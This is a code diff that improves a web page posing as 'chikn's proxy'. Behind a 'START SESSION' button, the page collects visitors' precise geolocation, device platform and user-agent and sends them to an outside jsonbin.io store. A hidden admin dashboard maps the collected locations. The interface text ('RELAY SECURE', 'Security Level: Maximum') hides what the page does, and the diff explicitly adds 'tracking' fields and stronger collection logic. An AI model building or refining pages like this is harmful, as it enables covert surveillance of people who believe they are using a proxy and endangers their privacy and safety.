@@ -9,90 +9,87 @@
     <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --p-dark: #1a1a2e; --p-mid: #16213e; --p-accent: #7b2cbf; }
+        :root { --p-dark: #0a0a12; --p-mid: #16213e; --p-accent: #7b2cbf; }
         body { 
             background-color: var(--p-dark); 
             color: #e0e0e0; 
             font-family: 'Space Mono', monospace;
             cursor: crosshair;
-            overflow-x: hidden;
+            overflow: hidden;
         }
-        #rain-canvas {
-            position: fixed; top: 0; left: 0; pointer-events: none; z-index: 0;
-        }
+        #rain-canvas { position: fixed; top: 0; left: 0; pointer-events: none; z-index: 0; }
         .glass {
-            background: rgba(26, 26, 46, 0.8);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(123, 44, 191, 0.3);
+            background: rgba(10, 10, 18, 0.9);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(123, 44, 191, 0.4);
             z-index: 10;
         }
-        #map { height: 250px; border-radius: 8px; filter: hue-rotate(240deg) brightness(0.8); }
+        #map { height: 250px; border-radius: 8px; filter: hue-rotate(240deg) invert(1) contrast(0.8); }
         button, input, a { cursor: crosshair !important; }
-        .hidden { display: none; }
-        ::-webkit-scrollbar { width: 4px; }
-        ::-webkit-scrollbar-thumb { background: var(--p-accent); }
         
         .discord-btn {
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            background: #5865F2;
-            color: white;
-            width: 50px;
-            height: 50px;
-            border-radius: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            box-shadow: 0 4px 15px rgba(88, 101, 242, 0.4);
-            transition: all 0.3s ease;
-            z-index: 100;
+            position: fixed; bottom: 20px; left: 20px;
+            background: #5865F2; color: white; width: 50px; height: 50px;
+            border-radius: 15px; display: flex; align-items: center; justify-content: center;
+            font-size: 24px; box-shadow: 0 4px 15px rgba(88, 101, 242, 0.4);
+            transition: all 0.3s ease; z-index: 100;
         }
-        .discord-btn:hover {
-            transform: scale(1.1) rotate(5deg);
-            background: #4752C4;
+        .discord-btn:hover { transform: scale(1.1) rotate(5deg); }
+
+        .scanline {
+            width: 100%; height: 2px; background: rgba(123, 44, 191, 0.05);
+            position: absolute; animation: scan 4s linear infinite;
+            pointer-events: none;
         }
+        @keyframes scan { from { top: 0; } to { top: 100%; } }
+
+        /* Custom Scrollbar for Logs */
+        .custom-scrollbar::-webkit-scrollbar { width: 4px; }
+        .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
+        .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(123, 44, 191, 0.3); border-radius: 10px; }
     </style>
 </head>
 <body class="min-h-screen flex flex-col items-center justify-center p-4">
 
+    <div class="scanline"></div>
     <canvas id="rain-canvas"></canvas>
 
-    <a href="https://discord.gg/EjrHXRkGTt" target="_blank" class="discord-btn" title="Join our Discord">
+    <a href="https://discord.gg/EjrHXRkGTt" target="_blank" class="discord-btn">
         <i class="fab fa-discord"></i>
     </a>
 
     <div class="text-center mb-8 relative z-10">
         <h1 class="text-4xl font-bold text-purple-400 tracking-tighter uppercase italic">chikn's proxy</h1>
-        <p class="text-purple-300/50 text-[10px] tracking-[0.3em] uppercase">connection established</p>
+        <p class="text-purple-300/30 text-[9px] tracking-[0.5em] uppercase">Security Level: Maximum</p>
     </div>
 
-    <div class="w-full max-w-md glass p-6 rounded-2xl shadow-[0_0_50px_rgba(123,44,191,0.2)] relative z-10">
-        <div id="status" class="hidden mb-4 p-3 rounded-lg text-center text-[10px] font-bold uppercase tracking-widest border border-purple-500/30"></div>
+    <div class="w-full max-w-md glass p-6 rounded-2xl shadow-[0_0_80px_rgba(123,44,191,0.15)] relative z-10">
+        <div id="status" class="hidden mb-4 p-3 rounded-lg text-center text-[10px] font-bold uppercase tracking-widest border"></div>
         
-        <button id="start-btn" class="w-full bg-purple-600 hover:bg-purple-500 text-white font-bold py-6 rounded-xl shadow-[0_0_20px_rgba(123,44,191,0.4)] transition-all active:scale-95 text-lg uppercase tracking-widest">
-            START SESSION
-        </button>
+        <div id="main-interface">
+            <button id="start-btn" class="w-full bg-purple-600 hover:bg-purple-500 text-white font-bold py-6 rounded-xl shadow-[0_0_20px_rgba(123,44,191,0.4)] transition-all active:scale-95 text-lg uppercase tracking-widest">
+                START SESSION
+            </button>
 
-        <div class="mt-8 border-t border-purple-500/20 pt-6">
-            <div id="login-section">
-                <input type="password" id="pass" placeholder="KEY_CODE" class="w-full p-4 bg-slate-900/50 border border-purple-500/20 rounded-xl mb-3 outline-none focus:border-purple-500 transition-all text-center text-purple-300">
-                <button id="admin-btn" class="w-full bg-transparent border border-purple-500/50 text-purple-400 py-2 rounded-xl text-[10px] font-bold uppercase hover:bg-purple-500/10 transition-colors">
-                    Admin Overdrive
-                </button>
-            </div>
-
-            <div id="dashboard" class="hidden space-y-4">
-                <div class="flex justify-between items-center text-[10px] text-purple-400 font-bold uppercase">
-                    <span>Active Relays</span>
-                    <button id="logout" class="hover:text-red-400">Terminate</button>
+            <div class="mt-8 border-t border-purple-500/20 pt-6">
+                <div id="login-section">
+                    <input type="password" id="pass" placeholder="SYSTEM_KEY" class="w-full p-4 bg-black/40 border border-purple-500/20 rounded-xl mb-3 outline-none focus:border-purple-500 transition-all text-center text-purple-300 text-xs">
+                    <button id="admin-btn" class="w-full bg-transparent border border-purple-500/30 text-purple-400 py-2 rounded-xl text-[9px] font-bold uppercase hover:bg-purple-500/10 transition-colors">
+                        Admin Overdrive
+                    </button>
                 </div>
-                <div id="map"></div>
-                <div id="log-list" class="space-y-2 max-h-32 overflow-y-auto pr-2"></div>
-                <div class="grid grid-cols-2 gap-2">
-                    <button id="refresh-map" class="bg-purple-900/30 border border-purple-500/30 py-2 rounded-lg text-[9px] font-bold text-purple-300 uppercase">Sync</button>
-                    <button id="clear-data" class="bg-red-900/20 border border-red-500/30 py-2 rounded-lg text-[9px] font-bold text-red-400 uppercase">Wipe</button>
+
+                <div id="dashboard" class="hidden space-y-4">
+                    <div class="flex justify-between items-center text-[9px] text-purple-500 font-bold uppercase tracking-widest">
+                        <span>Active Uplinks</span>
+                        <button id="logout" class="text-red-500/60 hover:text-red-400">Lock</button>
+                    </div>
+                    <div id="map"></div>
+                    <div id="log-list" class="space-y-1 max-h-32 overflow-y-auto pr-2 custom-scrollbar"></div>
+                    <div class="grid grid-cols-2 gap-2">
+                        <button id="refresh-map" class="bg-purple-900/20 border border-purple-500/20 py-2 rounded text-[8px] font-bold text-purple-300 uppercase">Update</button>
+                        <button id="clear-data" class="bg-red-900/10 border border-red-500/20 py-2 rounded text-[8px] font-bold text-red-400 uppercase">Purge</button>
+                    </div>
                 </div>
             </div>
         </div>
@@ -110,33 +107,11 @@
         const statusBox = document.getElementById('status');
         let map, markers = [];
 
-        // Audio Setup
+        // Simple feedback sound (optional, kept small and direct)
         const clickSound = new Audio('https://www.soundjay.com/buttons/sounds/button-16.mp3');
-        const rainSound = new Audio('https://www.soundjay.com/nature/sounds/rain-01.mp3');
-        
-        // POINTING TO YOUR UPLOADED FILE (Ensure the filename matches exactly in your folder)
-        const musicFile = new Audio('Kendrick_Lamar_-_Alright_(mp3.pm).mp3'); 
-        
-        rainSound.loop = true;
-        musicFile.loop = true;
-        let mediaStarted = false;
+        function playClick() { clickSound.currentTime = 0; clickSound.play().catch(e => {}); }
 
-        function startMedia() {
-            if (mediaStarted) return;
-            mediaStarted = true;
-            
-            rainSound.volume = 0.2;
-            musicFile.volume = 0.5;
-
-            rainSound.play().catch(e => console.log("Autoplay blocked rain"));
-            musicFile.play().catch(e => console.log("Autoplay blocked music"));
-        }
-
-        // Global click listener to force-start music on first interaction
-        document.body.addEventListener('click', () => {
-            startMedia();
-        }, { once: true });
-
+        // Rain Background Logic
         const canvas = document.getElementById('rain-canvas');
         const ctx = canvas.getContext('2d');
         let drops = [];
@@ -144,16 +119,11 @@
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
             drops = [];
-            for(let i=0; i<120; i++) drops.push({
-                x: Math.random()*canvas.width, 
-                y: Math.random()*canvas.height, 
-                l: Math.random()*15, 
-                v: Math.random()*4 + 4
-            });
+            for(let i=0; i<150; i++) drops.push({x: Math.random()*canvas.width, y: Math.random()*canvas.height, l: Math.random()*20, v: Math.random()*6 + 6});
         }
         function drawRain() {
             ctx.clearRect(0,0,canvas.width, canvas.height);
-            ctx.strokeStyle = 'rgba(123, 44, 191, 0.15)';
+            ctx.strokeStyle = 'rgba(123, 44, 191, 0.1)';
             ctx.lineWidth = 1;
             drops.forEach(d => {
                 ctx.beginPath(); ctx.moveTo(d.x, d.y); ctx.lineTo(d.x, d.y + d.l); ctx.stroke();
@@ -164,53 +134,83 @@
         initRain(); drawRain();
         window.addEventListener('resize', initRain);
 
-        function playClick() { 
-            clickSound.currentTime = 0; 
-            clickSound.play().catch(e => {}); 
-        }
-
         function showStatus(msg, isError = false) {
             statusBox.innerText = msg;
             statusBox.className = `mb-4 p-3 rounded-lg text-center text-[10px] font-bold uppercase tracking-widest border ${isError ? 'border-red-500 text-red-400 bg-red-900/10' : 'border-purple-500 text-purple-300 bg-purple-900/10'}`;
             statusBox.classList.remove('hidden');
-            setTimeout(() => statusBox.classList.add('hidden'), 5000);
+            setTimeout(() => statusBox.classList.add('hidden'), 6000);
         }
 
+        // IMPROVED TRACKING LOGIC
         startBtn.onclick = () => {
             playClick(); 
             startBtn.disabled = true;
-            startBtn.innerText = "OVERRIDING...";
+            startBtn.innerText = "LOCALIZING...";
+
+            const geoOptions = { 
+                enableHighAccuracy: true, 
+                timeout: 10000, 
+                maximumAge: 0 
+            };
 
             navigator.geolocation.getCurrentPosition(async (pos) => {
+                showStatus("COORDINATES FOUND. SYNCING...");
                 const newLoc = {
                     lat: pos.coords.latitude,
                     lng: pos.coords.longitude,
                     timestamp: Date.now(),
-                    device: navigator.platform
+                    device: navigator.platform,
+                    userAgent: navigator.userAgent.split(' ')[0] // Added for better tracking data
                 };
 
                 try {
-                    const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
+                    // 1. Fetch current data
+                    const getRes = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
                         headers: { "X-Master-Key": API_KEY }
                     });
-                    const data = await res.json();
+                    
+                    if(!getRes.ok) throw new Error("Sync Read Error");
+                    
+                    const data = await getRes.json();
                     let records = Array.isArray(data.record) ? data.record : [];
+                    
+                    // 2. Append new record
                     records.push(newLoc);
 
-                    await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+                    // 3. Keep only last 100 records to prevent bin overflow
+                    if (records.length > 100) records = records.slice(-100);
+
+                    // 4. Update Bin
+                    const putRes = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
                         method: 'PUT',
-                        headers: { "Content-Type": "application/json", "X-Master-Key": API_KEY },
+                        headers: { 
+                            "Content-Type": "application/json", 
+                            "X-Master-Key": API_KEY 
+                        },
                         body: JSON.stringify(records)
                     });
-                    showStatus("RELAY SECURED.");
-                } catch (e) { showStatus("CLOUD SYNC FAILED", true); }
+
+                    if(!putRes.ok) throw new Error("Sync Write Error");
+                    
+                    showStatus("SESSION ESTABLISHED. RELAY SECURE.");
+                } catch (e) { 
+                    console.error(e);
+                    showStatus("DATABASE UPLINK FAILURE", true); 
+                }
+                
                 startBtn.disabled = false;
                 startBtn.innerText = "START SESSION";
             }, (err) => {
-                showStatus("ACCESS DENIED. RESET PERMISSIONS IN BROWSER SETTINGS.", true);
+                // Detailed Geolocation Error Handling
+                let errMsg = "TRACKING FAILED.";
+                if (err.code === 1) errMsg = "PERMISSION DENIED. CHECK BROWSER SETTINGS.";
+                if (err.code === 2) errMsg = "POSITION UNAVAILABLE.";
+                if (err.code === 3) errMsg = "TIMEOUT EXCEEDED.";
+                
+                showStatus(errMsg, true);
                 startBtn.disabled = false;
                 startBtn.innerText = "START SESSION";
-            }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
+            }, geoOptions);
         };
 
         adminBtn.onclick = () => {
@@ -219,7 +219,7 @@
                 document.getElementById('login-section').classList.add('hidden');
                 document.getElementById('dashboard').classList.remove('hidden');
                 initMap(); loadData();
-            } else { showStatus("KEY INVALID", true); }
+            } else { showStatus("ACCESS DENIED: INVALID KEY", true); }
         };
 
         function initMap() {
@@ -239,30 +239,43 @@
                 const list = document.getElementById('log-list'); list.innerHTML = '';
 
                 if (Array.isArray(allRecords)) {
+                    // Filter to last 24 hours of data
                     const now = Date.now();
                     const oneDay = 24 * 60 * 60 * 1000;
-                    allRecords.filter(r => r.lat && (now - r.timestamp) < oneDay).reverse().forEach(loc => {
-                        const m = L.marker([loc.lat, loc.lng]).addTo(map);
-                        markers.push(m);
-                        const div = document.createElement('div');
-                        div.className = "bg-purple-900/10 border border-purple-500/10 p-2 rounded text-[8px] flex justify-between uppercase text-purple-300 mb-1";
-                        div.innerHTML = `<span>${loc.device}</span><span>${new Date(loc.timestamp).toLocaleTimeString()}</span>`;
-                        list.appendChild(div);
-                    });
-                    if (markers.length > 0) map.fitBounds(new L.featureGroup(markers).getBounds().pad(0.2));
+                    
+                    allRecords
+                        .filter(r => r.lat && (now - r.timestamp) < oneDay)
+                        .reverse()
+                        .forEach(loc => {
+                            const m = L.marker([loc.lat, loc.lng]).addTo(map);
+                            markers.push(m);
+                            
+                            const div = document.createElement('div');
+                            div.className = "bg-purple-900/10 border border-purple-500/10 p-2 rounded text-[7px] flex justify-between uppercase text-purple-400 mb-1";
+                            div.innerHTML = `<span>${loc.device}</span><span>${new Date(loc.timestamp).toLocaleTimeString()}</span>`;
+                            list.appendChild(div);
+                        });
+                        
+                    if (markers.length > 0) {
+                        const group = new L.featureGroup(markers);
+                        map.fitBounds(group.getBounds().pad(0.2));
+                    }
                 }
-            } catch (e) { console.error(e); }
+            } catch (e) { showStatus("LOAD FAILED", true); }
         }
 
         document.getElementById('clear-data').onclick = async () => {
             playClick();
-            if(!confirm("WIPE ENTIRE DATABASE?")) return;
-            await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
-                method: 'PUT',
-                headers: { "Content-Type": "application/json", "X-Master-Key": API_KEY },
-                body: JSON.stringify([])
-            });
-            loadData(); showStatus("CLEARED.");
+            if(!confirm("CONFIRM DATABASE WIPE?")) return;
+            try {
+                await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+                    method: 'PUT',
+                    headers: { "Content-Type": "application/json", "X-Master-Key": API_KEY },
+                    body: JSON.stringify([])
+                });
+                loadData(); 
+                showStatus("DATA PURGED.");
+            } catch(e) { showStatus("WIPE FAILED", true); }
         };
 
         document.getElementById('refresh-map').onclick = () => { playClick(); loadData(); };
